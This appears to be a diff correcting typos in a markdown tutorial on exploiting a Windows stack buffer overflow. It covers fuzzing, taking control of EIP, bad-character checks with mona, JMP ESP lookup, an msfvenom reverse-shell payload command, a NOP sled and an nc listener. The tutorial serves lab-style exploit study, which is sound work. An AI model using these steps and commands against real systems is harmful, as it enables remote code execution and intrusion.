@@ -1,7 +1,7 @@
 ##### BufferOverflow
 
 To exploit this application via buffer overflow, firstly the application must be crashed. This is done by using the fuzzer below. 
-This fuzzer will send an array of incrasing values, where the value is "A", until the applcicaiton crashs and will leave you with the correct number of bytes needed
+This fuzzer will send an array of increasing values, where the value is "A", until the application crashes and will leave you with the correct number of bytes needed
 to crash the application.
 
 fuzzy.py
@@ -37,8 +37,8 @@ for string in buffer:
     time.sleep(1)
     ```
     
-    Once the application has been crashed. It is time to overwrite and take controll of the EIP poiter. To do this I will create a unique pattern using
-    msf-pattern-create, using the gratest size of bytes used to crash the application via the fuzzer.
+    Once the application has been crashed. It is time to overwrite and take control of the EIP pointer. To do this I will create a unique pattern using
+    msf-pattern-create, using the greatest size of bytes used to crash the application via the fuzzer.
 
 Create a working directory for !mona
 ```    
@@ -102,15 +102,15 @@ except:
   ```
 Run check.py, EIP should be equal to 42424242 (hex value of “BBBB”). I now control EIP!
 
-Now that EIP has been controlled, it is crucical to gather a list of bad charecters, when the shellcode is generated any invalid charecters could
+Now that EIP has been controlled, it is critical to gather a list of bad characters, when the shellcode is generated any invalid characters could
 stop the payload from being read through the application. 
 
-Finding bad charecters with !mona. .\x00 is always concidered a bad charecter as it will trucate shellcode when executed.
+Finding bad characters with !mona. .\x00 is always considered a bad character as it will truncate shellcode when executed.
 
 Creating a list of badchars
 ```
 !mona bytearray -b "\x00"
-``` This will exlcude the bad charecters
+``` This will exclude the bad characters
 ```
 !mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
 ``` 
@@ -120,7 +120,7 @@ Repeat those two steps until the results status returns Unmodified, this indicat
 
 Finding JMP ESP
 
-Now that control of EIP has been taken, and all bad charecters have been elmininated, next thing needed is and adress to jump to ESP.
+Now that control of EIP has been taken, and all bad characters have been eliminated, the next thing needed is an address to jump to ESP.
 This can found using !mona.
 
 To load mona modules:
@@ -128,14 +128,14 @@ To load mona modules:
 !mona modules
 ```
 
-Finding a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a 
+Finding a .dll where Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a 
 JMP ESP (FFE4), inside the dll :
 ```
 !mona find -s "\xff\xe4" -m <DLL>
 ```
 Return address
 Choose an address in the results and update exploit.py :
-Setting the retn variable to the address, written backwards (little-endian)
+Setting the retn variable to the address, written backward (little-endian)
 
 ```
 # Example of a JMP ESP address
@@ -154,13 +154,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -
 
 Prepend NOPs
 
-A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the 
-size of the target area, \x90 represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
+A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area, \x90 represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
 ```
 padding = "\x90" * 16
 ```
 
-Start a nc listener on port 1234
+Start an nc listener on port 1234
 
 ```
 sudo nc -lnvp 1234
